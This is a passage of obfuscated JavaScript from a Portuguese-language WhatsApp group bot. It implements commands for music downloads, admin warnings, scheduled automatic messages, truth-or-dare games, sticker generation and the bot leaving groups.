                  getPreview = await axios.get("https://tinyurl.com/api-create.php?url=https://open.spotify.com/embed/track/" + _0x5aeb20.resultado.tracksArray[0].id + "?utm_source=generator&theme=0");
                  _0x5196be.sendMessage(_0x346d97, {
                    'text': "• ID: *" + _0x5aeb20.resultado.tracksArray[0].id + "*\n–\n• Nome da Música: *" + _0x5aeb20.resultado.tracksArray[0].title + "*\n• Duração: *" + dataUrl.resultado.duration + "*\n• Nome do(s) Artista(s): *" + _0x5aeb20.resultado.tracksArray[0].artists.map(_0x23d1d4 => '' + _0x23d1d4.name).join(", ") + "*\n• Url: *" + _0x5aeb20.resultado.tracksArray[0].url + "*\n• Preview 30s: *" + getPreview.data + '*',
                    'contextInfo': {
                      'externalAdReply': {
                        'title': "Escute " + _0x5aeb20.resultado.tracksArray[0].title + " em seu aplicativo do Spotify.",
                        'body': "Song • Duração: " + dataUrl.resultado.duration,
                        'thumbnail': await getBuffer(_0x5aeb20.resultado.tracksArray[0].thumb),
                        'mediaType': 0x1,
                        'sourceUrl': _0x5aeb20.resultado.tracksArray[0].url
                      }
                    }
                  });
                  const _0x1c5dfc = {
                    url: dataUrl.resultado.url
                  };
                  const _0x141fa9 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, {
                    'audio': _0x1c5dfc,
                    'fileName': _0x5aeb20.resultado.tracksArray[0].title + ".mp3",
                    'mimetype': "audio/mpeg"
                  }, _0x141fa9);
                }
              } catch (_0x34a7d7) {
                return _0x50740b("erro...");
              }
              break;
            case "removeradvertencia":
            case "removeradvertir":
            case "removeradverter":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x5e13bf) {
                return _0x50740b("Mencione o usuário que você deseja remover a advertência.");
              }
              if (_0x285e8e.includes(_0x5e13bf)) {
                let _0x3e615c = _0x285e8e.indexOf(_0x5e13bf);
                _0x285e8e.splice(_0x3e615c, 1);
                _0x137e44(_0x326cbd);
                _0x3f309c("Advertência removida do usuário: @" + _0x5e13bf.split('@')[0] + '.');
              } else {
                _0x3f309c("O usuário @" + _0x5e13bf.split('@')[0] + " não possui advertências.");
              }
              break;
            case "advertidos":
              {
                if (!_0x3f2f63) {
                  return _0x50740b("Apenas administrador pode usar este comando para ver a lista de pessoas que estão advertidas.");
                }
                let _0x22848f = _0x326cbd[0]?.["advertir"] || [];
                if (_0x22848f.length < 1) {
                  return _0x50740b("Não tem nenhum usuário advertido neste grupo.");
                }
                let _0x161359 = groupMembers.filter(_0x1e6959 => _0x22848f.includes(_0x1e6959.id)).map((_0x428fd5, _0x29d9b7, _0x248d11) => {
                  let _0x465b65 = " ❄️ ×==> " + (_0x29d9b7 + 1) + ": " + _0x428fd5.id.split('@')[0] + "\n ° Advertências: " + _0x22848f.filter(_0x539af9 => _0x539af9 === _0x428fd5.id).length + "/3\n\n";
                  return _0x29d9b7 === _0x248d11.length - 1 ? _0x465b65.trim() : _0x465b65;
                }).join('');
                _0x50740b("Lista dos advertidos:\n\n" + _0x161359);
              }
              break;
            case "rankgolpe":
              if (!_0x89cd51) {
                return _0x50740b("Só pode ser utilizado este comando, em grupo.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              try {
                d = [];
                ret = "🔪 *Os Mais Golpistas Do grupo* 🔪\n";
                for (_0x3194f3 = 0; _0x3194f3 < 5; _0x3194f3++) {
                  r = Math.floor(Math.random() * _0x3071b5.participants.length + 0);
                  ret += "🔪❧ @" + groupMembers[r].id.split('@')[0] + "\n";
                  d.push(groupMembers[r].id);
                }
                _0x1106fd(ret, d, true);
              } catch (_0x414464) {
                console.log(_0x414464);
                _0x50740b("Deu erro, tente novamente :/");
              }
              break;
            case "mensagem-automatica-24h":
            case "msg-auto-24h":
              try {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando é apenas para grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("❌ Você não é um administrador para usar este comando. Desculpe, talvez um dia você seja 😂");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("Eu não sou um administrador para executar esta ação.");
                }
                let [_0x34a048, _0x2fce4c] = _0x11e99e.split('|');
                let _0x52e866 = [];
                try {
                  if (fs.existsSync("./DADOS/json/msg_auto.json")) {
                    _0x52e866 = JSON.parse(fs.readFileSync("./DADOS/json/msg_auto.json", "utf8"));
                  }
                } catch (_0x67cc5a) {
                  console.error("Erro ao ler o arquivo JSON ou arquivo não encontrado:", _0x67cc5a);
                  _0x50740b("Erro ao ler o arquivo de mensagens automáticas.");
                  return;
                }
                let _0x159161 = _0x2fce4c && _0x2fce4c.toLowerCase().trim() === "sim";
                if (_0x2fce4c && !["sim", "nao"].includes(_0x2fce4c.toLowerCase().trim())) {
                  _0x159161 = false;
                } else {
                  if (_0x2fce4c === undefined) {
                    _0x159161 = false;
                  }
                }
                let _0x3c2d65 = '';
                if (_0x39e519 || _0x54198a || _0xee3727) {
                  let _0x317a44 = _0x54198a ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : _0xee3727 ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.videoMessage : _0xd2050d.message;
                  let _0x5754dc = _0x54198a ? "image" : "video";
                  let _0x762939 = await getFileBuffer(_0x317a44, _0x5754dc);
                  _0x3c2d65 = await upload(_0x762939);
                }
                const _0x349138 = {
                  hora: '∞',
                  msg: _0x34a048,
                  hidetag: _0x159161,
                  url: _0x3c2d65
                };
                let _0x27a7b3 = false;
                for (let _0x512d77 of _0x52e866) {
                  if (_0x512d77.id === _0x346d97) {
                    _0x512d77.messages.push(_0x349138);
                    _0x27a7b3 = true;
                    break;
                  }
                }
                if (!_0x27a7b3) {
                  const _0x11e4ac = {
                    id: _0x346d97,
                    messages: [_0x349138]
                  };
                  _0x52e866.push(_0x11e4ac);
                }
                fs.writeFileSync("./DADOS/json/msg_auto.json", JSON.stringify(_0x52e866, null, 2));
                _0x50740b("*Mensagens automáticas definidas com sucesso para cada hora do dia:*\n\nMensagem: " + _0x34a048 + "\nMarcação: " + (_0x159161 ? "sim" : "não") + "\nURL: " + _0x3c2d65);
              } catch (_0x56f22f) {
                console.error(_0x56f22f);
                _0x50740b("Ocorreu um erro ao definir as mensagens automáticas.");
              }
              break;
            case "dl-mensagem-automatica":
            case "dl-msg-auto":
            case "rm-msg-auto":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando é apenas para grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("❌ Você não é um administrador para usar este comando. Desculpe, talvez um dia você seja 😂");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("Eu não sou um administrador para executar esta ação.");
                }
                if (!_0x11e99e) {
                  return _0x50740b("Informe o horário da mensagem que você deseja apagar, solicite o comando: " + _0x141936 + "lista-mensagens-automaticas para ver os horários");
                }
                if (!_0x11e99e) {
                  return _0x50740b("Informe o horário em hh:mm.");
                }
                if (!/^([01]\d|2[0-3]):([0-5]\d)$/.test(_0x11e99e)) {
                  return _0x50740b("Formato de hora inválido. Use o formato hh:mm.");
                }
                let _0x510908 = [];
                try {
                  if (fs.existsSync("./DADOS/json/msg_auto.json")) {
                    _0x510908 = JSON.parse(fs.readFileSync("./DADOS/json/msg_auto.json", "utf8"));
                  }
                } catch (_0x1210ed) {
                  console.error("Erro ao ler o arquivo JSON ou arquivo não encontrado:", _0x1210ed);
                  _0x50740b("Erro ao ler o arquivo de mensagens automáticas.");
                  return;
                }
                let _0x1ad308 = _0x510908.findIndex(_0x4736bc => _0x4736bc.id === _0x346d97);
                if (_0x1ad308 !== -1) {
                  let _0x384c46 = _0x510908[_0x1ad308].messages.findIndex(_0x2d6ae6 => _0x2d6ae6.hora === _0x11e99e);
                  if (_0x384c46 !== -1) {
                    _0x510908[_0x1ad308].messages.splice(_0x384c46, 1);
                    if (_0x510908[_0x1ad308].messages.length === 0) {
                      _0x510908.splice(_0x1ad308, 1);
                    }
                    fs.writeFileSync("./DADOS/json/msg_auto.json", JSON.stringify(_0x510908, null, 2));
                    _0x50740b("Mensagem excluída com sucesso");
                  } else {
                    _0x50740b("Mensagem nesse horário não encontrada para este grupo");
                  }
                } else {
                  _0x50740b("Não há mensagens automáticas agendadas para este grupo.");
                }
              }
              break;
            case "limpar-mensagens-automaticas-24h":
            case "limpar-msg-auto-24h":
            case "rm-msg-auto-24h":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando é apenas para grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("Você precisa ser um administrador para executar este comando.");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("Eu preciso ser um administrador para executar esta ação.");
                }
                let _0x467b07 = [];
                try {
                  if (fs.existsSync("./DADOS/json/msg_auto.json")) {
                    _0x467b07 = JSON.parse(fs.readFileSync("./DADOS/json/msg_auto.json", "utf8"));
                  }
                } catch (_0x1ed3c7) {
                  console.error("Erro ao ler o arquivo JSON ou arquivo não encontrado:", _0x1ed3c7);
                  _0x50740b("Erro ao ler o arquivo de mensagens automáticas.");
                  return;
                }
                let _0x226d34 = _0x467b07.findIndex(_0x54c119 => _0x54c119.id === _0x346d97);
                if (_0x226d34 !== -1) {
                  let _0x3e0f5e = _0x11e99e.trim();
                  if (!_0x3e0f5e) {
                    let _0x301d02 = _0x467b07[_0x226d34].messages.filter(_0x1ff42b => _0x1ff42b.hora === '∞');
                    if (_0x301d02.length > 0) {
                      _0x467b07[_0x226d34].messages = _0x467b07[_0x226d34].messages.filter(_0x465bcd => !_0x301d02.includes(_0x465bcd));
                      if (_0x467b07[_0x226d34].messages.length === 0) {
                        _0x467b07.splice(_0x226d34, 1);
                      }
                      fs.writeFileSync("./DADOS/json/msg_auto.json", JSON.stringify(_0x467b07, null, 2));
                      _0x50740b("Foram removidas as mensagens marcadas como 24 horas.");
                    } else {
                      _0x50740b("Não foram encontradas mensagens automáticas marcadas como 24 horas para remover.");
                    }
                  } else {
                    let _0x525a51 = parseInt(_0x3e0f5e);
                    if (_0x525a51 > 0 && _0x525a51 <= _0x467b07[_0x226d34].messages.length) {
                      let _0x5f072b = _0x467b07[_0x226d34].messages[_0x525a51 - 1];
                      if (_0x5f072b.hora === '∞') {
                        _0x467b07[_0x226d34].messages = _0x467b07[_0x226d34].messages.filter(_0x3590ce => _0x3590ce !== _0x5f072b);
                        if (_0x467b07[_0x226d34].messages.length === 0) {
                          _0x467b07.splice(_0x226d34, 1);
                        }
                        fs.writeFileSync("./DADOS/json/msg_auto.json", JSON.stringify(_0x467b07, null, 2));
                        _0x50740b("A mensagem marcada como 24 horas número " + _0x525a51 + " foi removida.");
                      } else {
                        _0x50740b("A mensagem número " + _0x525a51 + " não está marcada como 24 horas.");
                      }
                    } else {
                      _0x50740b("Número inválido. Por favor, selecione um número dentro do intervalo.");
                    }
                  }
                } else {
                  _0x50740b("Não há mensagens automáticas agendadas para este grupo.");
                }
              }
              break;
            case "lista-mensagens-automaticas":
            case "lista-msg-auto":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando é apenas para grupos.");
                }
                let _0x527728 = JSON.parse(fs.readFileSync("./DADOS/json/msg_auto.json", "utf8"));
                let _0x230860 = _0x527728.find(_0x53d945 => _0x53d945.id === _0x346d97);
                if (!_0x230860 || _0x230860.messages.length === 0) {
                  return _0x50740b("Não há mensagens automáticas agendadas para este grupo.");
                }
                let _0x24a584 = _0x11e99e.trim().replace("|sim", '').trim();
                let _0x35bab5 = _0x11e99e.includes("|sim");
                if (_0x24a584) {
                  if (!/^([01]\d|2[0-3]):([0-5]\d)$/.test(_0x24a584)) {
                    return _0x50740b("Formato de hora inválido. Use o formato hh:mm.");
                  }
                  let _0x48968e = _0x230860.messages.filter(_0x5c97ff => _0x5c97ff.hora === _0x24a584 || _0x5c97ff.hora === '∞');
                  if (_0x48968e.length > 0) {
                    if (_0x35bab5) {
                      for (let _0x2fa361 of _0x48968e) {
                        if (_0x2fa361.url) {
                          if (_0x2fa361.url.endsWith("mp4")) {
                            const _0x2e4486 = {
                              url: _0x2fa361.url
                            };
                            const _0x3e2498 = {
                              video: _0x2e4486,
                              caption: _0x2fa361.msg
                            };
                            await _0x5196be.sendMessage(_0x346d97, _0x3e2498);
                          } else {
                            const _0x2a1344 = {
                              url: _0x2fa361.url
                            };
                            const _0x189340 = {
                              image: _0x2a1344,
                              caption: _0x2fa361.msg
                            };
                            await _0x5196be.sendMessage(_0x346d97, _0x189340);
                          }
                        } else {
                          _0x50740b("Problema com a URL da mensagem: nenhuma URL fornecida.");
                        }
                      }
                    } else {
                      let _0x3635c0 = "Lista de Mensagens Automáticas Deste Grupo:\n\n";
                      for (let _0x110406 of _0x48968e) {
                        let _0x56670f = _0x110406.hora === '∞' ? "A Cada Hora" : _0x110406.hora;
                        let _0x4db579 = _0x110406.hidetag ? "sim" : "não";
                        let _0x3a0bf1 = _0x110406.url ? _0x110406.url : '❄️';
                        _0x3635c0 += "Horário: *" + _0x56670f + "*\nMensagem: *" + _0x110406.msg + "*\nHidetag: *" + _0x4db579 + "*\nURL: *" + _0x3a0bf1 + "*\n\n";
                      }
                      _0x50740b(_0x3635c0.trim());
                    }
                  } else {
                    _0x50740b("Não há mensagens agendadas para o horário especificado.");
                  }
                } else {
                  if (_0x35bab5) {
                    for (let _0x4e9f91 of _0x230860.messages) {
                      if (_0x4e9f91.url) {
                        if (_0x4e9f91.url.endsWith("mp4")) {
                          const _0x33fd3e = {
                            url: _0x4e9f91.url
                          };
                          const _0x203735 = {
                            video: _0x33fd3e,
                            caption: _0x4e9f91.msg
                          };
                          await _0x5196be.sendMessage(_0x346d97, _0x203735);
                        } else {
                          const _0x1d8179 = {
                            url: _0x4e9f91.url
                          };
                          const _0x58a5c3 = {
                            image: _0x1d8179,
                            caption: _0x4e9f91.msg
                          };
                          await _0x5196be.sendMessage(_0x346d97, _0x58a5c3);
                        }
                      } else {
                        _0x50740b("Problema com a URL da mensagem: nenhuma URL fornecida.");
                      }
                    }
                  } else {
                    let _0x44e3b9 = "Lista de Mensagens Automáticas Deste Grupo:\n\n";
                    for (let _0x240000 of _0x230860.messages) {
                      let _0x35d9ec = _0x240000.hora === '∞' ? "A Cada Hora" : _0x240000.hora;
                      let _0x5796ab = _0x240000.hidetag ? "sim" : "não";
                      let _0x3fa831 = _0x240000.url ? _0x240000.url : "🙅🏼‍♂️️";
                      _0x44e3b9 += "Horário: *" + _0x35d9ec + "*\nMensagem: *" + _0x240000.msg + "*\nHidetag: *" + _0x5796ab + "*\nURL: *" + _0x3fa831 + "*\n\n";
                    }
                    _0x50740b(_0x44e3b9.trim());
                  }
                }
              }
              break;
            case "mensagem-automatica":
            case "msg-auto":
              try {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando é apenas para grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("❌ Você não é um administrador para usar este comando. Desculpe, talvez um dia você seja 😂");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("Eu não sou um administrador para executar esta ação.");
                }
                let [_0x59dafc, _0x46f327, _0x34dcca] = _0x11e99e.split('|');
                if (!_0x46f327 || !_0x59dafc) {
                  return _0x50740b("Informe a mensagem, o horário em hh:mm e se deseja ocultar as tags.");
                }
                if (!/^([01]\d|2[0-3]):([0-5]\d)$/.test(_0x46f327)) {
                  return _0x50740b("Formato de hora inválido. Use o formato hh:mm.");
                }
                let _0x2b3d2d = _0x34dcca && _0x34dcca.toLowerCase().trim() === "sim";
                if (_0x34dcca && !["sim", "nao"].includes(_0x34dcca.toLowerCase().trim())) {
                  _0x2b3d2d = false;
                } else {
                  if (_0x34dcca === undefined) {
                    _0x2b3d2d = false;
                  }
                }
                let _0x1eeb83 = '';
                if (_0x39e519 || _0x54198a || _0xee3727) {
                  let _0x3f6542 = _0x54198a ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : _0xee3727 ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.videoMessage : _0xd2050d.message;
                  let _0x429c64 = _0x54198a ? "image" : "video";
                  let _0x20f208 = await getFileBuffer(_0x3f6542, _0x429c64);
                  _0x1eeb83 = await upload(_0x20f208);
                }
                const _0x19631f = {
                  hora: _0x46f327,
                  msg: _0x59dafc,
                  hidetag: _0x2b3d2d,
                  url: _0x1eeb83
                };
                let _0x616f0b = [];
                try {
                  if (fs.existsSync("./DADOS/json/msg_auto.json")) {
                    _0x616f0b = JSON.parse(fs.readFileSync("./DADOS/json/msg_auto.json", "utf8"));
                  }
                } catch (_0x49d10e) {
                  console.error("Erro ao ler o arquivo JSON ou arquivo não encontrado:", _0x49d10e);
                  _0x50740b("Erro ao ler o arquivo de mensagens automáticas.");
                  return;
                }
                let _0x36e898 = false;
                for (let _0x37d417 of _0x616f0b) {
                  if (_0x37d417.id === _0x346d97) {
                    _0x37d417.messages.push(_0x19631f);
                    _0x36e898 = true;
                    break;
                  }
                }
                if (!_0x36e898) {
                  const _0x15ff05 = {
                    id: _0x346d97,
                    messages: [_0x19631f]
                  };
                  _0x616f0b.push(_0x15ff05);
                }
                try {
                  fs.writeFileSync("./DADOS/json/msg_auto.json", JSON.stringify(_0x616f0b, null, 2));
                  let _0x2ff63d = _0x2b3d2d ? "sim" : "não";
                  _0x50740b("*Horário de mensagem automática definida com sucesso:*\n\nHorário para mensagem: " + _0x46f327 + "\nMensagem: " + _0x59dafc + "\nMarcação: " + _0x2ff63d + "\nURL: " + _0x1eeb83);
                } catch (_0x50354f) {
                  console.error("Erro ao escrever no arquivo JSON:", _0x50354f);
                  _0x50740b("Ocorreu um erro ao salvar a mensagem automática.");
                  return;
                }
              } catch (_0x688ee5) {
                _0x50740b("Ocorreu um erro ao definir a mensagem automática.");
              }
              break;
            case "play":
              if (!_0x11e99e.trim()) {
                return _0x50740b("- Exemplo: " + _0x141936 + "play nome da música\na música será baixada, só basta escolher áudio ou vídeo, se não baixar, o YouTube privou de não baixarem, ou algo do tipo..");
              }
              const _0x4e4b5a = {
                '1': _0x141936 + "play_audio " + _0x11e99e,
                '2': _0x141936 + "play2 " + _0x11e99e,
                '3': _0x141936 + "play3 " + _0x11e99e,
                '4': _0x141936 + "play_video " + _0x11e99e,
                '5': _0x141936 + "play2_video " + _0x11e99e,
                '6': _0x141936 + "play3_video " + _0x11e99e,
                '7': _0x141936 + "playdoc " + _0x11e99e,
                '7': _0x141936 + "playdoc " + _0x11e99e,
                '9': _0x141936 + "360p " + _0x11e99e,
                '10': _0x141936 + "480p " + _0x11e99e,
                '11': _0x141936 + "1080p " + _0x11e99e
              };
              bui3 = _0x4e4b5a;
              _0x56d611[_0x346d97] = {
                'sender': _0x246d48,
                'time': Date.now() + 30000,
                'comandos': bui3
              };
              fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
              textAkinator = "Qual Formato Vc Deseja Para O Download?\n\n1 - 🎧 𝑨𝑼𝑫𝑰𝑶 📀\n2 - 🎧 𝑨𝑼𝑫𝑰𝑶 2 📀\n3 - 🎧 𝑨𝑼𝑫𝑰𝑶 3 📀\n4 - 📽 𝑽𝑰𝑫𝑬𝑶 🖥\n5 - 📽 𝑽𝑰𝑫𝑬𝑶 2 🖥\n6 - 📽 𝑽𝑰𝑫𝑬𝑶 3 🖥\n7 - 📁 𝑫𝑶𝑪𝑼𝑴𝑬𝑵𝑻𝑶 📁\n8 - 📁 𝑫𝑶𝑪𝑼𝑴𝑬𝑵𝑻𝑶 2 📁\n9 - 🎥 𝟯𝟲𝟬𝗣 🎥\n10 - 🎥 𝟰𝟴𝟬𝗣 🎥\n11 - 🎥 𝟭𝟬𝟴𝟬𝗣 🎥";
              const _0x21d86a = {
                text: textAkinator
              };
              const _0x512405 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x21d86a, _0x512405);
              break;
            case "playdoc":
              try {
                if (!_0x11e99e) {
                  return _0x50740b("Você precisa enviar um termo de busca!\nExemplo: " + _0x141936 + "playdoc kamaitachi");
                }
                await _0x50740b(enviar.espere);
                var _0x3a9183 = await _0x3af65f(_0x11e99e);
                _0x5aeb20 = await yts(_0x3a9183);
                ran = getRandom(".m4a");
                var _0x29d697 = " Não encontrado.";
                var _0xf9c182 = "\n๖ۣ• Titulo: " + (_0x5aeb20?.["videos"][0]["title"] || _0x29d697) + "\n๖ۣ• Tempo: " + (_0x5aeb20?.["videos"][0]["timestamp"] || _0x29d697) + "\n๖ۣ• Postado: " + (_0x5aeb20?.["videos"][0]["ago"] || _0x29d697) + "\n๖ۣ• Cᥲᥒᥲᥣ: " + (_0x5aeb20?.["videos"][0]["author"]["name"] || _0x29d697) + "\n๖ۣ• Descrição: " + (_0x5aeb20?.["videos"][0]["description"] || _0x29d697) + "\n\n■■■■■ 100% \n\nE᥉ᥴ᥆ᥣhᥲ ᥙ꧑ᥲ ᥆ρᥴᥲ᥆...\n\nSe desejar baixar o video, use " + _0x141936 + "play2_video " + _0x11e99e.trim() + "\n";
                lk = await ytdl(_0x5aeb20.videos[0].url, {
                  'quality': "140"
                }).pipe(fs.createWriteStream(ran));
                lk.on("finish", function () {
                  async function _0x400457() {
                    const _0x4b1591 = {
                      url: _0x5aeb20?.["videos"][0]["thumbnail"] || '' + logo
                    };
                    const _0x678f16 = {
                      image: _0x4b1591,
                      caption: _0xf9c182
                    };
                    const _0x4b3775 = {
                      quoted: _0xd2050d
                    };
                    await _0x5196be.sendMessage(_0x346d97, _0x678f16, _0x4b3775);
                    delay(500);
                    const _0x420dd0 = {
                      quoted: _0xd2050d
                    };
                    _0x5196be.sendMessage(_0x346d97, {
                      'document': {
                        'url': reqapi.play(_0x11e99e.trim(), true)
                      },
                      'mimetype': "audio/mpeg",
                      'fileName': _0x5aeb20?.["videos"][0]["title"] || "musica.mp3"
                    }, _0x420dd0);
                  }
                  _0x400457();
                });
              } catch {
                _0x50740b("ocorreu um erro.");
              }
              break;
            case "pgt_desafio":
            case "vdd_desafio":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              const _0x30c5fd = {
                '1': _0x141936 + "perguntavd",
                '2': _0x141936 + "desafiovd"
              };
              bui3 = _0x30c5fd;
              _0x56d611[_0x346d97] = {
                'sender': _0x246d48,
                'time': Date.now() + 30000,
                'comandos': bui3
              };
              fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
              textvdddsf = "🌹 *Pergunta / Desafio* 🌹\n\nEscolha uma opção abaixo entre pergunta e desafio, responda ou complete oque você escolheu, ou se preferir, pule.\n\nAs perguntas e desafios são a meu critério, e ai, vamos jogar?\n\nDigite O Número Da Opção\n1 - 🌹 VERDADE 🌹\n2 - 🌹 DESAFIO 🌹\n";
              const _0xf06ab2 = {
                url: "https://telegra.ph/file/8bbfde45f8544127bddc2.mp4"
              };
              const _0x50a719 = {
                video: _0xf06ab2,
                gifPlayback: true,
                caption: textvdddsf
              };
              const _0x4c68c4 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x50a719, _0x4c68c4);
              break;
            case "perguntavd":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              const _0x368486 = {
                text: '😇',
                key: _0xd2050d.key
              };
              const _0x2c7096 = {
                react: _0x368486
              };
              await _0x5196be.sendMessage(_0x346d97, _0x2c7096);
              sunsen = JSON.parse(fs.readFileSync("./DADOS/json/pgt.json"));
              moon = sunsen[Math.floor(Math.random() * sunsen.length)];
              _0x50740b(moon + "\n\n1 - 🌹 PRÓXIMA PERGUNTA 🌹\n2 - 🌹 DESISTIR 🌹\n");
              const _0xba58ee = {
                '1': _0x141936 + "perguntavd",
                '2': _0x141936 + "desistirvd"
              };
              bui3 = _0xba58ee;
              _0x56d611[_0x346d97] = {
                'sender': _0x246d48,
                'time': Date.now() + 30000,
                'comandos': bui3
              };
              fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
              break;
            case "desafiovd":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              const _0x2e9a59 = {
                text: '😈',
                key: _0xd2050d.key
              };
              const _0x23ddb7 = {
                react: _0x2e9a59
              };
              await _0x5196be.sendMessage(_0x346d97, _0x23ddb7);
              sunsen = JSON.parse(fs.readFileSync("./DADOS/json/desafio.json"));
              moon = sunsen[Math.floor(Math.random() * sunsen.length)];
              _0x50740b(moon + "\n\n1 - 🌹 PRÓXIMO DESAFIO 🌹\n2 - 🌹 DESISTIR 🌹\n");
              const _0x1b1838 = {
                '1': _0x141936 + "desafiovd",
                '2': _0x141936 + "desistirvd"
              };
              bui3 = _0x1b1838;
              _0x56d611[_0x346d97] = {
                'sender': _0x246d48,
                'time': Date.now() + 30000,
                'comandos': bui3
              };
              fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
              break;
            case "desistirvd":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              const _0xf660df = {
                text: '🙄',
                key: _0xd2050d.key
              };
              const _0xfe2ae6 = {
                react: _0xf660df
              };
              await _0x5196be.sendMessage(_0x346d97, _0xfe2ae6);
              _0x50740b(_0x671b4b + " que triste, não aguentou a jogar e pediu desistência, que triste mas fazer oque né...");
              break;
            case "ttp":
            case "ttp2":
            case "ttp3":
            case "ttp4":
            case "ttp5":
            case "ttp6":
            case "attp3":
            case "attp4":
            case "attp5":
            case "attp6":
              if (!_0x11e99e.trim()) {
                return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " ESDEATH");
              }
              _0x50740b(enviar.espere);
              typeS = _0x267d4b.includes("attp") ? "attp" : "ttp";
              packname = _0x4ecbb6;
              author = _0x56ed9d;
              const _0xfb408 = {
                packname: packname,
                author: author
              };
              encmedia = await _0x26d04a(await getBuffer("http://168.75.93.118:5051/api/" + typeS + "?command=" + _0x267d4b + "&text=" + encodeURIComponent(_0x11e99e)), _0xfb408);
              const _0x27296b = {
                url: encmedia
              };
              const _0x24ce66 = {
                sticker: _0x27296b
              };
              const _0xeb72d4 = {
                quoted: _0xd2050d
              };
              await _0x5196be.sendMessage(_0x346d97, _0x24ce66, _0xeb72d4);
              delay(5000);
              fs.unlinkSync(encmedia);
              break;
            case "sairgp":
              {
                if (!_0xf59944 && !_0xd2050d.key.fromMe) {
                  return _0x50740b("Este comando só o bot ou o dono pode executar..");
                }
                let _0x28da23 = await _0x5196be.groupFetchAllParticipating();
                let _0x2f1860 = Object.keys(_0x28da23);
                let _0x180a92 = _0x2f1860.map((_0xf6343a, _0x462a6e) => ({
                  'title': "• 💢 *Nome* : " + _0x28da23[_0xf6343a].subject,
                  'position': _0x462a6e + 1,
                  'description': "• 🚸 *Total Membros* : " + _0x28da23[_0xf6343a].participants.length,
                  'rowId': _0x141936 + "exitgp " + _0x28da23[_0xf6343a].id
                }));
                let _0x36edc7 = _0x180a92.reduce((_0x234147, _0x58d511, _0x3f9bc7) => {
                  _0x234147[_0x3f9bc7 + 1] = _0x58d511.rowId;
                  return _0x234147;
                }, {});
                textsr = _0x180a92.map(_0x24dc6d => "Posicao: " + _0x24dc6d.position + "\n" + _0x24dc6d.title + "\n" + _0x24dc6d.description + "\n\n").join(" ");
                let _0x2fa266 = "Qual deseja sair?\n\n" + textsr;
                _0x50740b(_0x2fa266);
                _0x56d611[_0x346d97] = {
                  'sender': _0x246d48,
                  'time': Date.now() + 30000,
                  'comandos': _0x36edc7
                };
                fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
              }
              break;
            case "exitgp":
              {
                if (!_0xf59944 && !_0xd2050d.key.fromMe) {
                  return _0x50740b("Este comando só o bot ou o dono pode executar..");
                }
                if (!_0x11e99e) {
                  _0x5196be.groupLeave(_0x346d97);
                } else {
                  let _0x4c7bc5 = await _0x5196be.groupFetchAllParticipating();
                  var _0x12914f = Object.keys(_0x4c7bc5);
                  if (!_0x12914f.includes(_0x11e99e.includes('@') ? _0x11e99e : _0x11e99e + "@g.us")) {
                    return _0x50740b("não estou nesse grupo mestre");
                  }
                  vy = await _0x5196be.groupMetadata(_0x11e99e.includes('@') ? _0x11e99e : _0x11e99e + "@g.us");
                  _0x50740b("Saindo do grupo: " + vy?.["subject"]);
                  const _0x43e882 = {
                    text: "Por motivos pessoais e para evitar bugs, o bot ira sair do grupo, caso desejar add ele novamente converse com meu dono.\n\nwa.me/" + numerodono_ofc
                  };
                  _0x5196be.sendMessage(_0x11e99e.includes('@') ? _0x11e99e : _0x11e99e + "@g.us", _0x43e882);
                  setTimeout(() => _0x5196be.groupLeave(_0x11e99e.includes('@') ? _0x11e99e : _0x11e99e + "@g.us"), 5000);
                }
              }
              break;
            case "sairgpaluguel2":
              {
                if (!_0xf59944 && !_0xd2050d.key.fromMe) {
                  return _0x50740b("Este comando só o bot ou o dono pode executar..");
                }
                let _0x4d8738 = [];
                let _0x2665d7 = Math.floor(Date.now() / 1000);
                let _0x4bb624 = _0x11e99e.normalize("NFD").replace(/[\u0300-\u036f]/g, '');
                let _0x2e05ae = await _0x5196be.groupFetchAllParticipating();
                let _0x550f98 = Object.entries(_0x2e05ae).slice(0).map(_0x2c91fc => _0x2c91fc[1]);
                switch (_0x4bb624.toLowerCase()) {
